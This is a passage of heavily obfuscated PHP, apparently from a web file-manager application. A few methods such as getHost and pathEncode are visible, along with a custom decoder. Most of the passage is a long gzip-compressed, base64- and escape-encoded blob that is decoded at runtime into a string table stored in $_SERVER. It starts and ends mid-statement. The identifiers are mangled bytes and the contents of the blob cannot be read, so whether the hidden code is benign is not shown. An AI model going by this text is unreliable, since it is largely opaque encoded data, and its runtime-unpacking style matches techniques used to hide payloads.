$aÛ™Œİõ‘ï . $E¤×í¢¾®›[8] . $aëŒâ¡õ’), $E¤×í¢¾®›[85] => 1, $E¤×í¢¾®›[86] => 0); if (substr($aëŒâ¡õ’, -1) != $E¤×í¢¾®›[8]) { $d¦Îíï¥Ü¶[$E¤×í¢¾®›[85]] = 0; $Déã­áó²· = $this->getPath($aÛ™Œİõ‘ï . $E¤×í¢¾®›[8] . $aëŒâ¡õ’); $d¦Îíï¥Ü¶[$E¤×í¢¾®›[86]] = isset($a˜Ô¢ô©õ[$Déã­áó²·]) ? $a˜Ô¢ô©õ[$Déã­áó²·] : $this->size($Déã­áó²·); } $e„ÀÎŒ¢Ú[] = $d¦Îíï¥Ü¶; } return $e„ÀÎŒ¢Ú; goto aÜ­Ä¼åÚö; aÜ­Ä¼åÚö: } public function slicePath($a»Ô˜½Ê®) { $CŸ±ÎÆòÔ =& $_SERVER[°Óó£ÌİóèÅ]; $d‘ØµÜ¤Ô£ = explode($CŸ±ÎÆòÔ[8], trim($a»Ô˜½Ê®, $CŸ±ÎÆòÔ[8])); $ağÊ™°§Á› = 0; do { ++$ağÊ™°§Á›; $f¿Şº‹ÉİÀ[] = implode($CŸ±ÎÆòÔ[8], array_slice($d‘ØµÜ¤Ô£, 0, $ağÊ™°§Á›)) . $CŸ±ÎÆòÔ[8]; } while ($ağÊ™°§Á› < count($d‘ØµÜ¤Ô£)); $f¿Şº‹ÉİÀ[count($d‘ØµÜ¤Ô£) - 1] = $a»Ô˜½Ê®; return $f¿Şº‹ÉİÀ; } public function getHost() { $d»«·øèÌ° =& $_SERVER[°Óó£ÌİóèÅ]; $f¸Õ‹È”«ù = parse_url(trim($this->domain, $d»«·øèÌ°[8])); $a„®½®Ö¹ = isset($f¸Õ‹È”«ù[$d»«·øèÌ°[173]]) ? $f¸Õ‹È”«ù[$d»«·øèÌ°[173]] : http_type(); $Fœà‚¥«İ = isset($f¸Õ‹È”«ù[$d»«·øèÌ°[174]]) ? $f¸Õ‹È”«ù[$d»«·øèÌ°[174]] : $f¸Õ‹È”«ù[$d»«·øèÌ°[84]]; if (isset($f¸Õ‹È”«ù[$d»«·øèÌ°[175]])) { $Fœà‚¥«İ .= $d»«·øèÌ°[4] . $f¸Õ‹È”«ù[$d»«·øèÌ°[175]]; } return $a„®½®Ö¹ . $d»«·øèÌ°[176] . $Fœà‚¥«İ; } public function pathEncode($FÄÁµ´–…Š) { $bÛÔí…Â÷Š =& $_SERVER[°Óó£ÌİóèÅ]; return str_replace($bÛÔí…Â÷Š[177], $bÛÔí…Â÷Š[8], rawurlencode($FÄÁµ´–…Š)); } } goto B·Â¥ÎÓ¼«; D§ÉÂ¬À¬õ: if (!function_exists('_kodDe')) { function _kodDe($Eº·ášÁÍØ) { $Eº·ášÁÍØ = base64_decode($Eº·ášÁÍØ); $c¯—·÷¿®í = strlen($Eº·ášÁÍØ); $bãèœ«áÚø = ''; $cÊõÓÖçÉ = ord($Eº·ášÁÍØ[0]) - 30; for ($DÓö¶«´¦ = 1; $DÓö¶«´¦ < $c¯—·÷¿®í; $DÓö¶«´¦ += 2) { if ($DÓö¶«´¦ + 1 < $c¯—·÷¿®í) { $bãèœ«áÚø .= chr(ord($Eº·ášÁÍØ[$DÓö¶«´¦ + 1]) + $cÊõÓÖçÉ); $bãèœ«áÚø .= chr(ord($Eº·ášÁÍØ[$DÓö¶«´¦]) + $cÊõÓÖçÉ); } else { $bãèœ«áÚø .= chr(ord($Eº·ášÁÍØ[$DÓö¶«´¦]) + $cÊõÓÖçÉ); } } return $bãèœ«áÚø; } } define(base64_decode('sNPzo8zd8+jF'), "\xa3"); $_SERVER[°Óó£ÌİóèÅ] = explode(base64_decode('fAN8AXwF'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\11\170\123\125\326\270\240\2\352\270\217\313\60\76\312\322\205\54\55\253\266\224\222\46\151\33\111\233\220\244\55\330\224"."\307\113\362\332\76\232\344\205\367\222\156\200\343\6\243\340\206\373\72\243\216\53\216\200\313\70\210\373\76\216\210\203\33\52\156\203\2\72\356\212\250\243\70\377\335"."\357\175\111\352\77\377\357\207\315\275\347\356\347\336\173\356\71\347\236\173\336\175\153\77\133\166\300\262\375\226\215\174\156\37\376\5\177\107\202\137\24\76\171\365\41"."\x23\xd0\x7f\x7\xa4\x2e\xd9\xba\xea\xc9\xca\x23\xbc\x47\x7e\xf5\xcc\xfa\x2f\xf\x78\xfa\xe7\x73\x1d\x9f\x3c\xf9\x40\xfd\xc8\xef\x94\x71\x17\x3c\xdf\x73\x40\xd5\xd1\xb7\x85\x8f\xf9"."\370\271\57\166\104\72\236\271\152\363\65\231\57\156\110\370\153\322\245\237\175\164\335\157\16\172\306\377\102\375\334\321\57\156\155\334\371\342\231\343\156\365\256\275\164".base64_decode('xu3vLn9q6bmHBbc9sjl0zG1HXHLf7nnOTSsf2vDjhvdaTnnt7M1Pr9rZfc9U').base64_decode('WV1z3cNvXPvaS0N3fbd01hHxBdN3fPT2rcvOnHP13UPfHH7Kvwc+vfTcR47d')."\171\375\323\35\221\205\261\330\375\322\107\367\157\63\177\116\157\226\66\65\124\15\334\163\365\323\341\151\307\172\276\373\317\47\375\177\330\376\247\203\32\16\70\370\344"."\x2f\xef\xf9\xe0\xd0\x13\x6f\x9a\xf3\xfe\xbf\x3f\xbb\xe3\xe6\x3d\xed\xcb\x3e\xdb\xf6\xd5\xaf\x36\x7f\x7e\xe4\x55\x5b\xf6\x1b\x31\x2\x8f\xb5\x1a\xff\x48\x69\x3d\x2b\xa9\x3\x9a\x99"."\65\61\40\256\247\273\264\156\34\326\322\370\327\211\177\314\45\111\55\253\342\260\334\22\210\310\341\326\140\320\33\212\310\244\106\61\75\245\47\110\50\243\30\112\212"."\124\236\121\15\23\64\45\126\47\147\364\214\232\266\100\70\40\241\144\225\230\142\222\232\74\365\262\307\33\364\7\26\310\221\5\101\57\311\21\223\227\344\124\143\20".base64_decode('x1AwnFWMbERLqSxHv8H6Ve9t9LVIkZCrJexyR3yBFgx2B5qbfZFCeCjg99e7')."\334\163\13\123\202\41\127\143\263\113\2\375\113\252\262\226\356\322\313\244\105\70\145\221\124\216\3\15\232\232\114\340\140\132\241\335\311\16\146\110\50\302\102\140\16".base64_decode('0rlkEkdaWIj0X+1SckmCM48YyRhaSqFDn6sOMigOKLmsrqXjOOIdyBoKh4Me')."\xc7\xd\x35\xa5\xa6\x49\x55\x61\xaf\xdf\xeb\x8e\x48\xb0\x9b\x52\x43\x28\xd0\x2c\x91\xa9\x48\x29\x66\x56\x35\xa4\xf6\x26\x6f\xc8\x2b\xc1\xae\xd7\x96\xa2\x11\x97\x4a\xb8\x5c\x6b\xb"."\x40\x88\xe4\xf2\xfb\xa5\xe1\x6a\xc8\xaa\xa9\xc\xad\x6\x97\x29\x52\x59\x20\xe4\xf1\x86\xa4\xfa\x5\x12\xc7\x53\x5c\x4f\xa5\xf4\xb4\x3\xd4\x2\xe6\x33\x2b\x74\xd5\x1b\xa\xe1\x80".base64_decode('jaxgvw9OHYkEGhrCXhYjg5vnBz2ZSlapJZboSmblPiWZo4u1F/+Wkh/yKytd')."\x5a\x52\xd\x6b\x43\xaa\x2f\x9d\xf\xc1\x71\x18\x93\xbb\xd5\xac\xc\xf6\x4f\x16\xf4\x95\x2c\x78\x25\x93\x71\x42\x7c\x27\x75\x25\xe1\xc8\xf4\x64\x30\x74\x34\xfe\xa9\xaa\xc4\xbf\xb9"."\164\122\113\367\212\365\342\260\156\222\132\226\150\151\55\107\266\10\351\270\256\233\164\243\231\154\347\222\200\112\3\151\226\11\124\240\223\75\15\72\330\207\203\265\263".base64_decode('8W8NyRSDne9TjayspuN6QksTMlBHukYWvpLt8RgayEcq1B1xPTPYrPcJqPCz')."\135\336\245\47\23\252\301\343\31\120\134\114\41\303\262\40\262\45\227\22\263\260\150\274\107\113\46\14\112\34\176\51\247\251\146\263\240\377\46\355\142\153\6\316\100"."\130\65\130\267\163\10\322\240\33\51\17\40\62\4\3\140\153\151\255\105\22\172\351\346\112\10\3\307\65\320\251\162\367\344\322\275\174\75\70\10\345\54\353\70\313"."\376\163\147\307\34\360\247\234\220\321\50\351\142\217\232\114\312\352\200\112\166\150\52\61\335\244\335\167\232\61\55\355\4\20\34\365\5\344\36\305\354\151\116\114\227"."\121\51\112\235\23\352\0\137\124\234\202\220\255\3\61\335\242\147\275\2\161\117\352\161\205\144\352\311\146\63\141\65\235\150\140\313\55\241\367\247\21\226\62\252\112"."\x86\xe5\xb1\x49\x9\xa9\x59\x5a\x20\x35\x55\x6b\xd5\x6c\xc1\x25\xb4\xae\x41\x4e\x5f\x7b\xb2\x29\x56\x25\xc5\x3e\x87\x99\xc\x98\x1d\x20\x2b\xa0\x84\xc4\xd5\x81\x2c\xc1\x88\x54\x13".base64_decode('71EMMGe1uWyX/RS2dZJaXMlqetqpx7Nq1m5mDVUhtZXUSHD+Ib2owKXoXnXj')."\15\150\217\30\112\332\354\122\15\273\227\54\346\152\11\40\225\321\113\232\315\243\231\31\335\324\140\63\325\222\222\315\52\361\36\110\153\170\365\265\277\220\137\203\73".base64_decode('Vy3I64rHVdO0wyKGnrS7kkm93x4wtG4NlKnI6yagg9USJdIZzVBNGpUamyMk')."\63\350\225\152\17\32\112\167\112\251\226\62\271\30\300\14\331\215\105\140\70\67\151\275\132\212\303\250\115\112\345\314\254\335\120\1\261\323\300\261\112\46\317\327\145"."\x6f\x86\xf3\xa9\xa9\x9\x7b\x18\x9c\x9\x4\x3c\xb5\x72\x9a\x4\x96\x8e\x44\xd3\x30\xb4\x29\x12\x9\xca\xbe\x6\x70\xf4\xb7\x78\xe5\x66\x57\xc4\xdd\x44\xba\x9d\x55\xba\x69\x9f\xfd"."\200\322\263\52\51\160\276\75\220\313\302\205\326\2\160\304\201\101\275\137\65\100\303\365\203\325\122\257\236\210\351\3\16\232\324\100\210\53\315\14\61\232\311\332\103".base64_decode('Srob4ic2mFVNenKF2rwhORxoiLS7QoQrSANMD9C6YNmkPaQmAG7jWVqjkoFo')._kodDe('KW6WQ9WIdUg949ZelVRzERi8rndja0EMJtCimqTNKSGuNkD3nTgh3hgIha3qKw==').strrev('¹JTr'."\n".'L²%$¦Œ<†r¥4•G*Î2ñ©Î³¢£Qå¿ƒ·.LMQSÚ')."\xd6\x85\xe4\x57\xd3\xdd\xd9\x1e\xc2\xd6\x85\xbc\xf3\x5a\xbd\xe1\x88\xdc\xec\x8d\x34\x5\x3c\xa4\xb4\xd7\xe5\xe1\xa3\xab\x76\x3a\x79\xc4\x64\x31\xbf\x8e\xb7\x1c\x1d\x48\x7\xfe\xe9"."\x24\x33\x3\x18\x8e\x6e\x35\xe\x8e\x33\x43\x49\x42\x62\x42\xd7\x91\x4a\x37\x77\xb7\xd6\xc5\xa9\xb3\xf\xb0\x45\xa4\x11\x4c\xbe\x78\x24\xac\xa5\x32\x94\xf0\x64\x7b\x72\xa9\x98\x10".strrev('aT‘ŞÕ!´YùB”ô&<œ‚§†tÅ(S‰ûÖ! İNÎÈÅ3òt')."\x49\x69\x52\x15\x7e\x34\x65\xd\x78\x7e\xf7\xd3\x38\xc9\xd2\xac\x66\x7b\x74\xb2\x31\xc0\xb9\x4f\xba\x94\x63\x7d\xa3\xbd\x4c\xa8\x49\x95\x62\xa9\x47\xa5\xe7\x5\x60\xd2\xfa\x18\xf2"."\x10\xfb\x48\x83\x26\x27\xc8\x30\x22\x9c\x91\x19\x43\xed\xd2\xc8\xaa\x6\xcc\x1b\x28\xce\x89\xb0\x66\x86\x40\xdd\x90\x99\xa2\xf1\x76\xc8\xf3\x72\x40\x96\xd3\x6b\x45\x68\x2\x46\x84"."\46\32\132\375\176\331\35\150\211\0\276\27\103\332\103\276\210\227\256\51\227\107\166\271\203\354\270\342\263\111\62\300\335\131\110\335\60\244\157\212\100\366\371\371\300"."\x29\x2e\x3d\xd4\x20\x45\xc5\x61\x40\xa\x33\x7a\xda\x54\xed\x84\xa7\xb2\x27\x38\xed\xc5\x39\x6a\xf2\x8\x6f\x41\x9\xce\x6d\xf\xd8\x95\xd4\x90\x3d\xa5\x66\x15\x3b\xeb\xfa\xe2\xc"."\341\160\62\224\325\131\234\121\111\50\226\312\10\113\236\37\354\375\132\202\62\60\75\252\326\335\103\31\163\313\111\51\105\104\26\301\107\46\235\223\335\44\70\222\201"."\x5c\x44\x8f\xe5\x60\x20\x4c\xa\xd4\x41\x28\xe0\x62\x62\xaa\x41\x86\x14\x6c\x25\x49\x29\x61\xc1\x35\x7a\x23\xf4\x78\x55\xaa\xc8\xb2\x6c\xf\x53\x5a\x99\x3\x19\xd\x6d\x48\xe1\x78"."\252\243\35\41\225\16\244\222\234\43\213\64\371\132\346\312\315\1\217\327\57\373\132\0\75\215\24\302\133\203\36\27\135\7\42\274\76\20\151\262\100\133\1\321\151"."\x73\xf9\x7d\xf9\xd9\xbd\xf3\x7d\xe1\x48\xb8\x68\x12\x80\xb5\x7a\xf3\x52\x80\xa8\x17\xc\x79\x1b\x7c\xf3\x59\xb4\xc1\xe7\xf5\x7b\xc2\xb2\xdb\xe5\x6e\xe2\x79\x5a\x5c\xcd\x24\x22\x77".strrev('ç®8^‘¢ô(\\2S,•1%ó/ç)’>Qx8Î§âƒîM‘3hàËóZtËaA')."\350\302\145\274\133\212\222\224\224\102\66\253\322\107\326\124\31\376\51\227\134\141\51\233\221\31\361\210\15\262\40\32\6\215\3\146\215\264\57\21\112\136\320\3\31"."\xe6\xa9\x57\xbb\x74\x43\xfd\x25\x80\xab\x2b\x4b\xf7\x78\x7e\x1c\x6c\x21\x9e\x6\x66\xc0\x85\xa4\x6b\xb0\x12\xd0\x8c\xc8\x74\x5b\x9a\x40\x2e\x70\xd1\xee\x74\x71\xc9\x56\xe\x4\xbd"."\41\27\224\213\345\366\120\240\245\221\24\350\357\121\151\7\174\4\375\145\224\255\41\342\161\226\123\47\300\223\50\234\275\244\110\137\254\123\124\56\303\77\223\310\326"."\x4\x9c\x2f\x39\x76\xd2\x14\xeb\x31\x48\xca\x19\xd\xa1\xb2\x7\x58\xf4\x94\xc\xeb\x39\xd6\x5a\x4c\xd7\x93\x74\x1f\x82\x83\x9b\x91\xe\x26\x58\x2f\x36\xe9\x22\x19\xa0\x74\x6a\x32"."\151\160\200\120\205\110\140\256\267\105\246\53\13\307\204\325\210\1\100\124\15\204\10\102\262\172\57\25\134\160\142\310\33\246\273\330\120\227\344\64\212\56\247\143\62"."\131\305\52\70\261\110\363\316\205\321\376\311\145\35\366\311\216\116\20\50\257\230\203\243\44\26\165\130\242\23\110\371\234\301\112\303\103\276\314\254\53\257\216\72\243".strrev('±\'ÚŒMÖ©ø\'|n±aËi¶)Òç@\'Ê:NwµOÚU±H}—êº²Î')."\150\116\107\264\263\264\172\362\270\250\143\174\264\277\263\242\274\216\266\23\317\31\100\50\213\17\262\256\46\46\227\201\56\1\76\207\145\111\43\222\46\144\240\11\103".base64_decode('WoZDl85YTuFgDtVuXqLDHp3cWSeUE0D5bQE+CNDXHpbPZT8djowVhfuerI9c')."\x3a\xce\x89\x24\xdc\x17\x31\x25\x4e\xe8\x80\xd6\x9d\x66\x5b\x8\xb0\x0\x4c\x18\xb6\xf2\xcf\x4b\x27\xe2\xdf\xe5\x74\x22\xbb\x55\x7a\x42\x43\x3d\x9a\x41\x56\x67\x2e\xad\x2d\xa1\x2a".base64_decode('hrS6hAT0LF3fMTXbr9LlAeCWOFgcVGgDSUIsiTg+0gIXnFQkRZBRZGTIqPWz')."\130\102\115\223\171\32\105\162\233\161\45\243\206\205\21\312\162\304\125\357\367\312\224\302\20\112\114\343\210\52\326\63\245\34\30\32\247\250\114\2\345\274\265\54\42"."\x2f\xa3\x50\x6\x1\xca\xa8\xec\xd0\x77\x96\x45\xa3\xb9\xe\x35\xd1\xd9\x1\x16\xa4\x62\xef\xea\x5c\x3a\x75\x79\x39\x65\x8b\x9d\x51\xf0\x1f\x8d\x60\x3a\x44\x5a\xce\xf0\x79\x30\x1".base64_decode('lxXPsvOvQL8lM0oGu8DUBLrBuSsA5/xqVs8qSZYNpkUghFINenRCdkLQ8iGK')."\xd6\xc2\x54\x58\x82\x5e\x89\x29\x10\xac\x30\x9b\x10\xc5\x7f\x6b\x89\x74\xec\xf3\xd8\x9\xba\x5d\xf3\xed\x3e\xc2\xb7\xb3\x80\x46\x1a\xfc\xfe\xa7\x33\x77\xbe\xf4\xcf\x6b\x56\xbe\xfa".base64_decode('Po5fvFKoq0CpvaKtM3101RHH7bjz+hLnw9LkzEjPIZFVZYsPmCUd8+BDlz29')."\xea\xbe\x85\x6f\xbe\xfb\xf\x6f\xed\x88\x83\xdf\x3f\xe2\xed\x33\x4f\x7a\x62\xfa\x86\x6d\xf1\x8b\xb7\xbd\x79\x76\xc5\xf4\x6f\x2e\x7c\xee\x9b\x1f\x7\x2f\xbd\xb2\xb7\xe7\xd3\x9d\x3b"."\176\376\152\337\370\357\146\376\64\163\355\53\307\172\156\350\171\262\373\205\317\146\67\75\240\357\367\322\346\320\363\47\146\347\154\217\36\167\124\312\266\255\146\303\47"."\331\203\77\267\135\163\311\246\177\66\56\232\175\320\67\237\137\163\137\14\360\346\155\332\373\307\275\376\344\15\277\155\265\77\260\117\372\374\324\206\337\116\330\175\336".base64_decode('vOOPcf7af/XIpg2P33H2isq7P3xk9YefLHxi1ITV395sbDzvXfeeXz17/rh/')."\113\137\157\271\165\360\300\27\234\327\335\275\152\333\43\307\77\364\265\157\314\230\237\136\277\165\342\346\351\137\16\35\321\177\172\356\263\37\217\57\161\217\33\23\11".strrev('Çõû9ï¿’àbøo×Oåt~îv‹¶ÿÛî…&§Şğÿ,\'ïûà=˜û¹-ò®')."\345\267\77\377\130\331\370\25\117\74\355\255\375\171\317\53\216\133\313\317\336\267\136\372\127\355\304\215\273\36\272\316\66\375\205\376\252\365\67\76\272\162\355\372\104".strrev('è{A§¾˜¯£ë×^wSÒwõx_M(MçÁë;ØM'."\r".' İê7ãáí9ßãs,')."\xe9\x93\x7b\xfe\x75\xda\xed\x7f\xdd\xf6\x97\xa6\xc3\xc3\x23\x6f\x6a\x93\xb7\xba\xe\x9b\x77\xd5\xce\x93\xee\x1a\xfb\xc3\xb7\x99\xe5\x7b\xff\xd1\xfd\xee\x7e\xb\xaf\xde\xb9\xfe\x8c"."\53\32\76\233\74\151\302\253\223\356\137\362\301\173\163\267\156\73\140\317\247\236\117\163\225\207\134\343\170\164\312\315\77\276\271\141\311\3\113\267\155\273\74\371\341"."\35\47\237\161\357\314\167\317\135\324\365\300\316\333\373\317\377\375\237\152\116\130\172\301\147\343\173\215\45\237\116\173\374\31\367\373\366\231\77\376\136\151\351\120\332"."\x6e\x3e\xd5\xff\xbc\xfb\xd6\xde\xe9\xa3\xd6\x8c\xb8\x30\xbe\xf9\x82\xb9\xe7\x8f\x37\x6a\xa6\x8c\xfa\xe1\xc9\x77\x8f\x79\xe3\x89\xf6\xb5\xbd\xb6\x13\x6e\xb7\x3f\x7a\xc2\x4d\x97\x7c"."\364\302\375\53\337\137\167\305\151\347\374\141\351\214\107\277\272\153\374\173\373\64\373\361\157\45\336\274\310\377\373\215\145\7\154\171\370\376\235\47\236\230\172\371\355".base64_decode('STcbVx331v6htj/9+uTISy89WhO8+GDnqsPn3/qhfZv52fUh2+n3/O6Mn37a')."\xb7\x6f\xdb\xee\x11\x8f\x5e\x7e\xfb\x6d\x33\x8f\xbb\x68\x72\xeb\x3f\xef\x9f\xfc\x5a\x72\xe4\x94\xb7\xcf\xfc\xcb\xcd\x6f\x9e\x30\xd4\xb5\xbe\x57\x79\xe4\x6e\xf9\xf8\xb5\xf7\xdd\xba".base64_decode('Otk8qfO4xXfkzng9Wn74wOrasQta7M/9MHXX0de88vmWx479+8kHLpm1cO8j')."\x3f\x8c\x69\x5a\xf8\xcf\x9\xcb\xf\xa1\x17\x13\x80\x3\x6\xdb\xd6\xaf\xf6\x51\x36\xc0\xd4\x73\x46\x5c\x65\x4b\xdf\x22\xb0\x54\x31\x1e\x6\x64\x70\x19\x86\x32\x28\x96\x1\x32\x9a".base64_decode('AoAiqAnKnlRc03QZQ2W4kTEsjADePkY6cN1iIqKADiyCiZwW7jnNayvWX67f').base64_decode('htVy6agwRqvhmtGsYgAGkecqHqflrDHc2VaT9gMr8Xjc2vWCKdBMjyDGckzi')."\70\121\143\3\101\320\335\3\204\67\172\62\300\261\6\265\364\40\75\344\170\134\24\376\301\41\311\56\204\310\104\333\140\116\33\37\236\215\216\305\306\207\141\243\170".strrev('¡h—Z'."\r".'Ç•|¡úqr*}è~pceÇÅ‰¶BKÖ¤Å6•m÷BlèÙÔQµ')."\x55\x33\xc3\x3d\xa0\x33\x11\x72\xaa\xa0\x8\x29\x1\x83\x6c\x8e\x61\x44\x66\x5c\x9\xea\x72\x8\xb5\x2e\x2c\x69\xcb\xda\xd3\x33\x83\x78\xf8\xd\x86\x9e\xf2\x5\x1c\x26\xbc\xf3\xfa"."\57\362\251\224\163\206\215\40\315\160\141\41\45\201\224\302\303\325\111\223\131\125\34\143\112\46\23\312\221\331\316\44\163\114\271\202\303\54\51\50\44\71\142\302\6".base64_decode('cihcLIFcmkFLtIb8cDboHMGonmNZqbKrNeQjLANTjVNuETMWQ4AVjDrlzgoC')."\x6e\xa6\xaa\x31\x2a\x7e\xbb\xdc\x3c\xc0\xc4\xc6\x5\x29\x32\xd0\x7a\xc0\x1c\xe6\xe8\x8c\x67\x95\x6c\xce\xcc\xcb\x40\xef\x58\xe2\xa2\xd2\xae\x57\x55\xa9\xa\x8a\x2a\xb9\x38\x2b\x61"."\xe6\x90\xaa\x98\xa6\x73\x54\xc2\x5\x2b\xb0\x1c\x30\x1a\x16\xf3\xc6\xd3\x59\x21\x19\xc4\x2c\xa9\x50\xdb\x3\x67\x9c\xc7\xd8\x12\x4\x58\x65\x4c\x18\x96\x79\x1c\xb0\x87\xe\xeb\x80"."\x2a\xab\x2c\x39\x12\x31\x4b\x3a\x83\xd2\x75\x92\x9f\xd2\x95\xf\x8f\x21\xd4\x39\x28\x6\x62\x2\x26\x95\x4\x90\x98\x1d\x59\xc5\xec\x75\x88\x60\xbb\x98\xa\xd8\x3e\x30\xd6\xa4\xc3"."\x7a\x1f\xcc\x3b\xc7\x65\xf6\xd4\xa0\xb9\x24\x59\x90\xcc\x31\x85\x9b\x90\xb\x46\x27\x62\x8f\x9c\x4\x92\x62\xc6\xd9\x39\xc1\x95\x91\x9a\xce\x49\x2e\x15\xe8\xf1\xcf\x22\x1b\xbd\x1"."\56\227\220\122\43\54\221\233\76\33\371\75\14\377\104\311\302\215\222\345\135\152\43\167\27\236\172\341\152\73\223\40\163\126\315\22\75\141\262\46\11\102\234\20\41".strrev('ª¢äóxH¶!lî±yâ\'K\'ˆµÏbu¶¾A—$±òÁÃ‘‚››t')."\113\40\271\174\371\130\127\270\145\141\131\367\6\41\361\350\356\330\46\341\6\155\22\274\375\262\111\326\173\105\237\207\317\251\270\326\14\65\223\124\342\254\123\231\101"."\251\13\110\336\360\376\242\13\154\42\211\352\300\245\254\316\302\205\275\22\17\355\274\161\130\366\146\376\110\54\211\0\241\71\166\131\307\116\52\361\14\102\242\25\307"."\51\216\62\345\156\30\324\304\344\61\103\115\150\124\253\242\246\120\116\252\211\104\7\36\123\347\304\223\252\142\300\112\164\252\277\236\125\7\210\47\264\13\311\326\324".base64_decode('kVtiWWiQhLl2XYQm9XivpTIIENIk1TB0owZSpVoOJYtYyOvg4H6ifukizTVb')."\207\3\272\141\147\43\4\275\6\304\67\141\42\313\26\262\104\307\21\354\12\367\277\41\216\34\130\34\341\352\27\212\146\305\1\145\0\201\117\63\171\123\141\374\200"."\231\124\350\45\270\11\350\77\340\205\30\202\163\46\73\256\246\263\71\220\23\32\145\24\310\224\125\13\364\13\336\164\160\176\21\306\370\215\7\144\61\170\132\106\61"."\xcd\x7e\x20\xcb\x92\x35\xe0\x8d\x48\x50\x15\x15\x96\x38\x55\x71\x37\xb9\x42\x4c\xdd\x34\xdd\x51\xe9\xa8\xe2\x79\x41\x83\x32\xd4\xba\xd5\xd2\x1b\xd4\x70\xc4\x15\x2a\x62\xb\x83\x6d"."\x64\x8\xf6\x88\x5d\xc\x29\xd0\x14\x68\x97\xdc\x1\x7f\x6b\x73\x4b\x18\x1b\x7f\x60\x78\x4b\x40\x48\x47\x4a\x5\x4b\xb2\x8\x26\xd5\x7a\x83\x7e\x97\xdb\x2b\xf9\x5a\x22\x1\xaa\x2d".strrev('„‹¤!\'f¢9ËE–ˆ­Z4­‡\\–DÕ‘¬[.¢#)í™ï74­RBSJd')."\x3\x45\x13\x67\x87\x44\x82\x1e\x32\xba\x6a\x16\x4a\x98\x64\x1a\x9b\xc3\xe1\x79\xe4\x2\x25\x10\x72\xb9\xfd\xb4\x47\xf5\xae\x30\x9\x6\xdc\x84\x57\xd9\x7d\xf9\x3d\x1f\x6e\xba\x68"."\xf7\x75\xeb\x76\x9e\x7f\x21\xa8\x68\xd7\xb5\x67\xef\xba\xea\x81\xf\x37\x5e\xf8\xd1\x39\x8f\xec\x5c\x77\xc1\xee\x47\x2f\xda\x75\xf9\xfa\x5d\x17\x9c\x45\x86\xf1\xd1\xfa\xbf\x7e\xf8"."\310\143\273\57\277\143\347\272\253\167\135\371\340\356\153\317\305\11\37\337\171\317\316\125\167\260\216\111\37\137\366\350\256\213\156\335\165\305\206\135\27\256\333\271\351"."\xb2\x9d\xf\x9f\xbd\x73\xe3\x46\x1b\x28\xfd\xf1\x8a\xb\x77\x3f\xb2\x6e\xd7\x79\x57\xee\xfa\xd3\x99\xbb\xfe\xb2\x7a\xd7\xf5\x17\xee\x5c\x75\xd3\xce\x6b\xee\xd8\x7d\xd1\xfa\x9d\x37".base64_decode('n7Nz5YUfrb9iXP46wvEOOiOE+DkXRs2KMozlqDkZYrgc/JZBHST4pSobsPrC').strrev('Æt%:2ÈË¶)ñº2ãDbGjrKªl·×àUØ”búuó{qkA')."\343\15\273\103\276\172\57\321\162\261\211\232\210\264\67\104\46\0\320\160\250\215\205\331\35\130\201\325\227\124\306\317\174\313\100\24\300\174\47\163\251\64\352\254\124"."\2\265\102\45\66\170\122\242\13\6\251\4\222\160\0\120\343\140\347\225\101\333\15\130\245\255\164\101\251\255\322\126\125\56\21\223\60\134\202\230\200\111\45\304\374".base64_decode('i5WzNGKLWWJVtspyqSTTW0L6xfEKei/jnKak2MpIh8Xu8ryA0plZQ9HSWVOK')."\333\30\210\225\7\277\26\263\256\270\203\227\300\363\4\162\344\303\44\127\213\307\232\23\133\203\5\113\45\45\235\0\51\30\277\342\64\227\226\113\61\11\135\52\110"."\105\22\121\61\13\62\152\55\310\50\233\114\310\105\260\221\315\67\126\31\112\370\336\10\167\113\61\351\104\21\50\232\52\10\305\263\105\363\352\140\30\140\162\160\176"."\x10\x60\x29\xbd\xea\x20\xaf\x9\x50\x25\x96\x40\x67\x10\xc2\xd9\x24\x16\x49\x43\x66\x7a\x25\x98\xed\xc0\xe3\x4c\x99\xdd\x94\xe2\x11\x3b\xad\xe6\x5\x6c\xc\x74\x2d\x93\x29\x50\xb9".base64_decode('kR+8AfNG3E14lYeFZZ6ITbQsVI5OybJEktzCAuXD2wUShFEon6+lIRBqxjc/')."\x61\x77\x93\xb7\xd9\xe5\x20\xb4\x1c\xaf\x4\x9c\x1f\xb2\xb3\x52\xad\x54\xa\x29\x1f\x6\x95\x5a\xd0\x8f\x1a\xa2\x28\x8b\xa0\x56\xc1\xbe\x92\xb3\xaa\x99\xc5\x58\xc8\x74\x93\xce\x90".strrev('™Ì0µFá^«£C…Ku@³È@ˆ¡RmG¥j³b–ÔŠ‚€1—Ù')."\145\62\347\122\324\4\41\216\135\112\34\110\122\324\52\54\106\15\134\101\27\140\313\356\100\113\203\217\136\205\171\142\226\64\117\310\7\15\126\110\347\44\132\203\160".base64_decode('7wgiXIUAIpn+BAtz8weYwPgBEOHsAIiwkwjmEgxwQfutgFJyCtzuYeEmdgsN')."\23\2\41\41\342\12\271\232\303\54\32\152\7\24\35\302\204\333\332\146\127\70\2\106\325\322\332\314\251\276\337\325\6\26\114\200\363\50\224\142\227\71\52\352\312"."\xa3\xf8\x2e\xa\x7\xf1\xcf\x1c\x1a\x83\xe2\x7a\xe7\xd2\x2a\x9b\x34\x63\x79\x39\xc9\x43\x6f\x6f\xe4\x6c\x8f\x96\xa6\x2c\x22\x6c\x65\x9e\x5f\xf6\x7\x1a\x71\x1c\xd9\xff\x7a\xd3\x9"."\xce\x10\x4b\x1d\x52\x28\x97\x86\x71\x22\x45\x99\xf4\xf8\x62\x3b\x42\x2\xeb\x58\xc2\x17\xdc\x52\x4b\xa0\xdd\xc5\x8d\x49\x85\x4\xc\x21\xfc\xaa\xc4\x4d\x4c\x9d\xb\x3b\xa2\xfd\x51".base64_decode('B2AfzEX8islTL1HGxN2jUpaXmly76IlKjw4qN8pJvZsacQESSRkI/DufBhD1')."\44\5\200\4\225\111\322\53\47\174\327\45\107\227\105\47\105\355\16\174\275\7\271\232\250\215\367\114\366\316\7\247\156\70\154\271\233\224\221\341\43\251\35\214\231".base64_decode('hPA+xpFZ5IcIA7MIJkh0di2bWu+8ZS3g/8bIMi/43w9+/BEweRrLADap3zfX')."\xbb\xc\xfe\xe1\x9\xe5\x92\x98\xc1\xd7\xb2\xc\xfc\x5\x24\x66\x99\xaf\x25\xbf\x70\xbd\x37\xd2\xee\xf5\xe2\xc\x34\x4c\x7e\x79\x56\x40\x72\xc8\xd0\x4\xeb\xf0\xd3\x2\xf4\x2a\x5a"."\362\173\33\42\22\214\323\146\145\271\14\41\317\336\71\271\134\226\235\146\53\131\55\314\370\247\254\164\102\125\51\71\105\134\141\67\247\277\